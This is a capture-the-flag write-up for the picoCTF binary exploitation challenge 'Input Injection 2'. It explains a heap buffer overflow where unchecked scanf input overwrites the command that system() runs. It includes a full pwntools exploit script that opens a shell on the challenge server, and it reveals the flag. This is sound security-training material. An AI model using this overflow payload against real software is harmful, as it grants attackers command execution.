# Input Injection 2 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoMini by CMU-Africa, Buffer Overflow

## Description ##
This program greets you and then runs a command. But can you take control of what command it executes?

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. Inspecting the C file, I noticed that it leaks the address of username and address of shell. Then it copies "/bin/pwd" into `shell` and copies the user input into `username`. After that, it calls `system` with the arguments `shell`.

    char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);

Since `scanf("%s", username);` does not check for buffer overflow, I can overflow `username` and change the value of `shell` to "/bin/sh". To figure out the padding, I can subtract the address of `shell` from the address of `username` (This will give me the distance from the start of `username` to the start of `shell`). Before I write a payload script to overflow `username`, I check the security features of the binary file:
    pwndbg> checksec
    Arch:     amd64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

No additional security featues are enabled. So I get started on writing a payload script:

    from pwn import *

    # Port will vary
    HOST = 'amiable-citadel.picoctf.net'
    PORT = 60732

    p = remote(HOST, PORT)
    # p = process('./vuln')

    # Get username and shell address
    p.recvuntil(b'username at ')
    usernameLoc = int(p.recvline(), 16)

    p.recvuntil(b'shell at ')
    shellLoc = int(p.recvline(), 16)

    # Calcuate padding
    padding = shellLoc - usernameLoc

    print(f"Padding: {padding}")

    # Overflow to shell 
    payload = b'a'*padding + b'/bin/sh' + b'\x00'

    p.sendline(payload)

    p.interactive()

Running the payload script, I got the following output:
    Enter username: $ ls
    flag.txt
    $ cat flag.txt
    picoCTF{us3rn4m3_2_sh3ll_6538c392}$

Flag: picoCTF{us3rn4m3_2_sh3ll_6538c392}

## Reflection ## 
This challenge was a buffer overflow challenge. Compare to the previous challenge (Input Injection 1), there isn't really much difference. The only difference is that I am given the address of `shell` and `username` which allows me to calculate the padding. But even if they didn't leak the address, it is still possible to calculate the padding by using gdb. All in all, this is a simple challenge that helps you understand buffer overflow. 


